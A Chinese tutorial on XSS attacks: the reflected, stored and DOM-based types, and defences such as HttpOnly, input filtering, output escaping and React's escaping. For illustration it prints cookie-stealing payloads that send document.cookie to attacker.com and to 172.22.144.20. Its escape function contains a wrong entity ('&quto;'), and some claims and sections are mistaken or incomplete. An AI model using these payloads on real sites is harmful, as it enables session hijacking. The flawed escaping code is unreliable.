# XSS 攻击

## 什么是 XSS 攻击？

XSS 是 Cross-Site Scripting（跨站脚本攻击）的简称。为了和 CSS 区分，所以把攻击的第一个字母改为 X。

是一种代码注入攻击。攻击者通过在在网站注入恶意脚本，使之在用户的浏览器上运行。恶意脚本可以获取用户的信息如 cookie 等，进而危害数据安全。

以下情况容易发生 XSS 攻击

1. 从一个不可靠的链接进入到一个 Web 应用程序
2. 没有过滤掉恶意代码的动态内容被发送给 Web 用户

恶意脚本一般包括 JavaScript，有时也会包含 HTML 和 Flash。攻击方式有很多种，但他们的 _共同点为_：

**将一些隐私数据像 cookie、session 发送给攻击者，将受害者重定向到一个由攻击者控制的网站，在受害者的机器上进行一些恶意操作**。

Q:跨站体现在哪里？

所获取到的 cookie 发送给 XSS 平台

Q:常见的 XSS 平台？

DVWA

## XSS 分类

根据攻击的来源，可以分为存储型、反射型、DOM 型。

| 类型       | 存储区                  | 插入点          |
| ---------- | ----------------------- | --------------- |
| 反射型 XSS | URL                     | HTML            |
| 存储型 XSS | 后端数据库              | HTML            |
| DOM 型 XSS | 后端数据库/前端存储/URL | 前端/JavaScript |

### 反射型 XSS

反射型指的是：攻击者构建了特殊的 URL，当服务器接收到请求后，从 URL 中获取数据，拼接到 HTML 后返回，从而导致恶意代码的执行。

场景：假设有一个电商网站，它允许用户通过一个 GET 请求的查询参数 q 来搜索商品，用户搜索后，搜索词会显示在结果页面上。如果网站没有正确处理输入内容，攻击者便可以利用这个漏洞。

```bash
http://example-ecommerce.com/search?q=<script>var img = new Image(); img.src='http://attacker.com/steal?cookie=' + document.cookie;</script>
```

反射型是在无害 URL 的基础上构造特殊的 URL，在 URL 上给注入点注入特殊的字符串，当别人点击构造的链接时触发恶意代码；

具体流程：

1. 当攻击者构建了这个 URL 之后，会把这个 URL 做成一个链接，用户点击了这个链接之后就会执行恶意代码。
   - 为了隐蔽起见，可能会使用一些技术比如：短网址，把现在 URL 压缩。这样用户更容易上当。
2. 用户点击之后会把 cookie 发送给攻击者。
3. 使用你的身份进行登陆电商网站，进行购物/删除订单等。

常见于 GET 的方式，POST 的内容也可以触发

低危漏洞

### 存储型 XSS

存储型指的是：攻击者将恶意代码提交到了网站的数据库中，当用户请求数据的时候，服务器将其拼接为 HTML 后返回给了用户，从而导致了恶意代码的执行。

比如将 恶意代码提交到后端去，那么所有访问这个网页的用户，都会报错。

场景：

比如一个留言板，攻击者在留言板写入恶意代码，提交的字符串上传到了服务器，当别人访问这个留言板时就会触发代码；

代码执行的过程中，有可能会获取用户的 cookie，然后发送到攻击者所在的机器上，或者指定的服务器上，这样攻击者就可以盗用用户的 cookie 登录到这个网站

具体流程：

有个论坛，大家可以发布留言。然后后面的用户进来可以看到这些留言，假设你输入的留言服务端没有做任何过滤和转译

- 如果说留言是一个文本输入框，那么攻击者如果输入 `<script>alert('这里我注入一些恶意代码')</script>` 那么浏览器就会执行里面的代码，所有进入这个页面的用户，就都会弹出这些内容。
- 同样是这个输入框，如果用户是写入的如下代码

  ```javascript
  <script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'http://attacker.com/steal-cookie?cookie=' + document.cookie, true);
  xhr.send();
  </script>

  <script>
    document.write('
    <img src="http://172.22.144.20/?'+document.cookie+'" />
    ');
  </script>
  ```

那么用户浏览到这个页面的时候，就会把自己的 cookie 发送到这台机器上。然后攻击者可以使用拿到的 cookie 信息，登录账号做一些恶意行为

高危漏洞

### DOM 型 XSS

DOM 型指的是：攻击者构建了特殊的 URL，用户打开网站后，网站正常响应，在一些特殊的地方脚本会执行。比如点击锚点定位时。

类似于反射型，区别在于 DOM 型 XSS 并不会和后台进行交互，前端直接将 URL 中的数据不做处理并动态插入到 HTML 中，是纯粹的前端安全问题，要做防御也只能在客户端上进行防御。

场景：网站上有个几张图片，当你点击之后会切换，同时 URL 会有 `#xxx` 的锚点，方便用户刷新后直接定位到该图片。此时 URL 大概长这样 `http://post.com/img#1`，如果没有做处理攻击者可以把 url 改写成 `http://post.com/img#' onerror='alert()'`

低低危漏洞

## 防范措施

### HttpOnly

浏览器将禁止页面的 JavaScript 访问带有 HttpOnly 属性的 Cookie

就是服务器在 setCookie 的时候，设置 HttpOnly；

在 cookie 中设置 HttpOnly 属性后，JS 脚本将无法读取到 cookie 信息。

它解决的是 XSS 后 Cookie 劫持问题。就是无法拿到这种类型的 Cookie。

### 输入检查（输入过滤）

原则：**不要相信用户的任何输入**。

措施：对于用户的任何输入要进行检查、**过滤**、**转义**。建立可信任的字符和 HTML 标签白名单，对于不在白名单之列的字符或者标签进行过滤或编码。

说明：而在一些前端框架中，都会有一份 decodingMap， 用于对用户输入所包含的特殊字符或标签进行编码或过滤，如 <，>，script，防止 XSS 攻击。

一般是对输入格式的检查，例如：用户名、密码、邮箱、电话号码...等，按照规定的格式输入。

### 输出检查（转义 HTML）

一般说来，所有需要输出到 HTML 页面的变量，全部需要使用编码或者转义来防御。

措施：对内容进行编码或者转义。

比如对于 `"`、`<`、`>`、`/`、`&`、`'` 等进行转义

```javascript
function escape(str) {
  str = str.replace(/&/g, '&amp;');
  str = str.replace(/</g, '&lt;');
  str = str.replace(/>/g, '&gt;');
  str = str.replace(/"/g, '&quto;');
  str = str.replace(/'/g, '&#39;');
  str = str.replace(/`/g, '&#96;');
  str = str.replace(/\//g, '&#x2F;');
  return str;
}
```

### 白名单

## React 如何防范 XSS 攻击

React DOM 在渲染所有输入内容之前，默认会进行转义。

所有的内容在渲染之前都被转换成了字符串，因此恶意代码无法成功注入，从而有效地防止了 XSS 攻击。我们具体看下：

但是有一个需要自己考虑 `dangerouslySetInnerHTML`

```javascript
<p
  dangerouslySetInnerHTML={{
    __html: getURL(dialogData.content),
  }}
/>
```
